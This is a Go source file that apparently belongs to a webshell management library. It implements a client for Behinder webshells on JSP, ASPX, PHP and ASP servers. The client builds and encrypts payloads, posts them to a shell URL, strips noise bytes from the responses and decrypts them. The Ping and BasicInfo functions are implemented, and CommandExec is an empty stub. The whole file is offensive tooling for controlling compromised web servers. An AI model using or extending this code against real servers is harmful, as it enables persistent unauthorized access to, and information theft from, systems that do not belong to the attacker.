package wsm

import (
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/go0p/wsm/lib/dynamic"
	"github.com/go0p/wsm/lib/httpx"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"github.com/go0p/wsm/lib/utils"
)

type BehinderInfo struct {
	BaseShell
	secretKey   []byte
	encryptMode int
	// response 开头的干扰字符
	prefixLen int
	// response 结尾的干扰字符
	suffixLen int
}

func NewBehinder(b *BehinderInfo) (*BehinderInfo, error) {
	err := b.Verify()
	if err != nil {
		return nil, err
	}
	b.secretKey = utils.SecretKey(b.Password)
	if b.Headers == nil {
		b.Headers = make(map[string]string, 2)
	}
	b.Headers = b.setHeaders()
	b.Client = httpx.NewClient(b.Proxy, b.Headers, b.Script, "")
	return b, nil
}

func (b *BehinderInfo) setHeaders() map[string]string {
	h := b.Headers
	switch b.Script {
	case shell.JavaScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	case shell.CsharpScript:
		// 也可以不加
		h["Content-type"] = "application/octet-stream"
	case shell.PhpScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	case shell.AspScript:
		h["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
	return h
}

func (b *BehinderInfo) setParams(i interface{}, p shell.IParams) (map[string]string, error) {
	var params map[string]string
	var err error
	if p == nil {
		switch i.(type) {
		case *behinder.PingParams:
			i.(*behinder.PingParams).SetDefaultAndCheckValue()
		case *behinder.BasicInfoParams:
			i.(*behinder.BasicInfoParams).SetDefaultAndCheckValue()
		default:
			return nil, errors.New(fmt.Sprintf("%v is undefined", i))
		}
		params, err = utils.ToMapParams(i)
		if err != nil {
			return nil, err
		}
	} else {
		p.SetDefaultAndCheckValue()
		params, err = utils.ToMapParams(p)
		if err != nil {
			return nil, err
		}
	}
	return params, nil
}

// processParams 只有 java 的 payload 需要这两个参数
func (b *BehinderInfo) processParams(p map[string]string) {
	if b.Script != shell.JavaScript {
		delete(p, "forcePrint")
		delete(p, "notEncrypt")
	}
}

func (b *BehinderInfo) Ping(p ...shell.IParams) (bool, error) {
	var pp shell.IParams
	if len(p) == 0 {
		pp = nil
	} else {
		pp = p[0]
	}
	params, err := b.setParams(&behinder.PingParams{}, pp)
	if err != nil {
		return false, err
	}
	b.processParams(params)
	data, err := behinder.GetPayload(b.secretKey, "EchoGo", params, b.Script, b.encryptMode)
	if err != nil {
		return false, err
	}
	resp, err := b.Client.DoHttpRequest(b.Url, data)
	if err != nil {
		return false, err
	}
	content := params["content"]
	wantResultTxt := fmt.Sprintf(`{"msg":"%s","status":"c3VjY2Vzcw=="}`, base64.StdEncoding.EncodeToString([]byte(content)))
	wantResultTxt2 := fmt.Sprintf(`{"status":"c3VjY2Vzcw==","msg":"%s"}`, base64.StdEncoding.EncodeToString([]byte(content)))
	//var enWantResult []byte
	var enWantResult, enWantResult2 []byte
	if params["notEncrypt"] == "true" {
		enWantResult = []byte(wantResultTxt)
		enWantResult2 = []byte(wantResultTxt2)
	} else {
		enWantResult, err = behinder.Encrypto([]byte(wantResultTxt), b.secretKey, b.encryptMode, b.Script)
		if err != nil {
			return false, err
		}
		enWantResult2, err = behinder.Encrypto([]byte(wantResultTxt2), b.secretKey, b.encryptMode, b.Script)
		if err != nil {
			return false, err
		}
	}
	rawBody := resp.RawBody
	b.prefixLen, b.suffixLen, err = dynamic.GetPrefixLenAndSuffixLen(rawBody, enWantResult, enWantResult2)
	if err != nil {
		return false, err
	}
	resData, err := behinder.Decrypto(rawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)
	if err != nil {
		return false, err
	}

	result := newBResult(resData)
	err = result.Parser()
	if err != nil {
		return false, err
	}
	msg := result.ToMap()["msg"]
	if msg == content {
		return true, nil
	} else {
		return false, errors.New(msg)
	}
}

// BasicInfo 不传参数就使用默认参数值
func (b *BehinderInfo) BasicInfo(p ...shell.IParams) (shell.IResult, error) {
	var pp shell.IParams
	if len(p) == 0 {
		pp = nil
	} else {
		pp = p[0]
	}
	params, err := b.setParams(&behinder.BasicInfoParams{}, pp)
	if err != nil {
		return nil, err
	}
	b.processParams(params)
	data, err := behinder.GetPayload(b.secretKey, "BasicInfoGo", params, b.Script, b.encryptMode)
	if err != nil {
		return nil, err
	}
	resp, err := b.Client.DoHttpRequest(b.Url, data)
	if err != nil {
		return nil, err
	}

	resData, err := behinder.Decrypto(resp.RawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)
	if err != nil {
		return nil, err
	}
	result := newBResult(resData)
	err = result.Parser()
	if err != nil {
		return nil, err
	}
	return result, nil
}

func (b *BehinderInfo) CommandExec(p shell.IParams) (shell.IResult, error) {
	return nil, nil
}
